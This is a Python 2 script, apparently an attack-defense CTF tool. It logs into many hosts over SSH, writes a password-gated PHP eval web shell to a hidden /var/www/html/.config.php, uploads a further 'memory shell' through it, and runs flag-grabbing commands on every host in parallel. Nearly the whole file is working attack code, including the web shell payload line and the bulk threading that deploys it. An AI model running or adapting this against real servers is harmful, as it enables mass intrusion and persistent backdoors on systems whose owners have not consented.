#coding:utf-8
# author : p0desta
import requests
import paramiko
import threading
import  time
import argparse
from judgeip import *
from memoryup import *
from command import *
def ssh(ip,username,passwd,cmd):  #批量修改ssh密码/执行命令
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(ip,22,username,passwd,timeout=5)
        for m in cmd:
            stdin, stdout, stderr = ssh.exec_command(m)
#           stdin.write("Y")   #简单交互，输入 ‘Y’
            out = stdout.readlines()
            #屏幕输出
            for o in out:
                print o,
        print '%s\tOK\n'%(ip)
        ssh.close()
    except :
        pass
def ssh_execmd(args): # 调用ssh函数执行命令
    ip = args.ip
    iplist = split(ip)
    username = raw_input("input ssh name:")
    passwd = raw_input("input ssh passwd:")

    default_c = "echo \"<?php if(md5(\$_POST['pass'])==='9b114784e0951159b37d5afacac7199c')@eval(\$_POST['cmd']); ?>\" > /var/www/html/.config.php"

    print "default_c:  echo \"<?php if(md5(\$_POST['pass'])==='9b114784e0951159b37d5afacac7199c')@eval(\$_POST['cmd']); ?>\" > /var/www/html/.config.php"
    cmd1 =  raw_input("you want to exec(use default_c input 1):")

    if cmd1 == "1":
        cmd1 = default_c
    cmd = []
    cmd.append(cmd1)
    print "Begin......"
    if len(iplist)==1:
        ssh(ip,username=username,passwd=passwd,cmd=cmd) # 单个IP的情况
    else:
        for i in iplist:
            a = threading.Thread(target=ssh, args=(i, username, passwd, cmd))
            a.start()
    time.sleep(2)
    f = raw_input("upload memory shell? (0 or 1):")
    #这里上传的路径和访问的shell是之前利用ssh连接写入进去的
    if f == "1":
        ph = open("p0desta.top.php","r")
        php = ph.read()
        ph.close()


        for i in iplist:
            a = threading.Thread(target=make_sudo, args=("http://" + i + "/.config.php", "cmd","http://" + i + "/config.php",php))
            a.start()
    else:
        exit()
    time.sleep(2)
    c = raw_input("are your want to exec and submit flag?(1 or 0):")
    if c =="1":

        cmd2 = raw_input("input your getflag command:")
        for i in iplist:
            a = threading.Thread(target=do_command,args=("http://"+ i + "/.config.php","cmd",cmd2,"1"))
            a.start()
    else:
        exit()



